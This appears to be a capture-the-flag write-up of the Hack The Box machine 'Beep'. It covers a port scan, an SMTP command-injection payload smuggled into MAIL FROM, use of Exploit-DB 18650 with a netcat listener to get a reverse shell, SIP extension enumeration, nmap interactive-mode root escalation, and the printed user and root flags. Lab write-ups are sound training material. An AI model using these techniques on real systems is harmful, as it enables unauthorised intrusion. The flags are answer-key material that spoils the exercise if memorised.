<H1 style="text-align: center;">Hack The Box </H1>
<H2 style="text-align: center;">Beep write up </H2>
<H2 style="text-align: center;">By Michael ThugBounty Keck </H2>
<p style="text-align: center"><img src="/images/Beep/Beep.png"></p>


# Recon
The researcher started out with a scan of the host (10.10.10.3) using naabu<sup>1</sup>
```naabu -host 10.10.10.7 -p - -c 500 -nmap-cli 'nmap -sV -sC -n -Pn -oN active-hosts' -o naabu.txt```

|Status|IP|Port| Status | IP | Port |
| -----|--|----------- | --- | -- | ---| 
| open | 10.10.10.7 | 22 | open | 10.10.10.7 | 993 |
| open | 10.10.10.7 | 25 | open | 10.10.10.7 | 995 |
| open | 10.10.10.7 | 80 | open | 10.10.10.7 | 995 |
| open | 10.10.10.7 | 110 | open | 10.10.10.7 | 3306 |
| open | 10.10.10.7 | 111 | open | 10.10.10.7 | 4190 |
| open | 10.10.10.7 | 143 | open | 10.10.10.7 | 4445 |
| open | 10.10.10.7 | 443 | open | 10.10.10.7 | 4559 |
| open | 10.10.10.7 | 878 | open | 10.10.10.7 | 5030 |
| open | 10.10.10.7 | 10000 |
<p style="text-align: center"><img src="/images/Beep/beep%20(2).jpg"></p>

# User enum
<details>
    <summary>PORT 22 OpenSSH 4.3</summary>
    <p>Moving on from this one until creds are found.</p>
 </details>
 <details>
    <summary>PORT 25 Postfix smtpd</summary>
    <p> 
    smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
    Attempted to find the ver of the service but I was not able to.
    Then tried a quick manual test to see if RCE was possible. 

```
HELO x 
MAIL FROM:<;ping -c 4 192.168.49.161;> 
RCPT TO:<root> 
DATA 
<enter> 
vry4n 
. 
QUIT

```
This did not work. 
</p>
</details>
<details>
    <summary>PORT 80 http</summary>
    <p>Port 80 redirects to 443.</p>
 </details>
 <details>
    <summary>PORT 443 https</summary>
    <p>Going to https://10.10.10.7 I found a elastix sign in page.
    I tried some defult creds root:root, admin:admin, and elastix: elastix and all failed.
    Next I used google search and found an exploit 18650.py<sup>2</sup> 
    After updating the RHOST, LHOST, AND PORT I started a nc listener.
    
```
    nc -nlvp 4444
``` 
and ran the script, 
```
python2.7 18650.py 
```
but failed to get a call back. 
after some research I found a suite of VoIP tools that could be used to find an open extention since ext 1000 was not working. 
I downloaded sipvicious<sup>3</sup>. From the sipvicious wiki<sup>4</sup> I was able to find the proper commend 

```
./svwar -m INVITE 10.0.0.1
```
The command returned an open ext 233<p style="text-align: center"><img src="/images/Beep/beep%20(1).jpg"></p>
.  I again updated my 18650.py with the new ext <p style="text-align: center"><img src="/images/Beep/beep%20(4).jpg"></p>
 and ran it again, this time I did get a call back.
Looking at the exploit there was a way to upgrade to admin right away. The user needed to run

```
sudo nmap --interactive

```
then 

```
 !sh 
```
Since I was root I went a head and got both flags.<p style="text-align: center"><img src="/images/Beep/beep%20(3).jpg"></p>
 
USER FLAG:5be8f535cdf2b007b64885bf766db5d6
ROOT FLAG:a874a4316d949910a7fe32ca0da02907
 </p>
 </details>

 <p>No other ports were needed.</p>
 



REF
1. https://github.com/projectdiscovery/naabu
2. https://www.exploit-db.com/exploits/18650
3. https://www.kali.org/tools/sipvicious/
4. https://github.com/EnableSecurity/sipvicious/wiki/SVWar-Usage

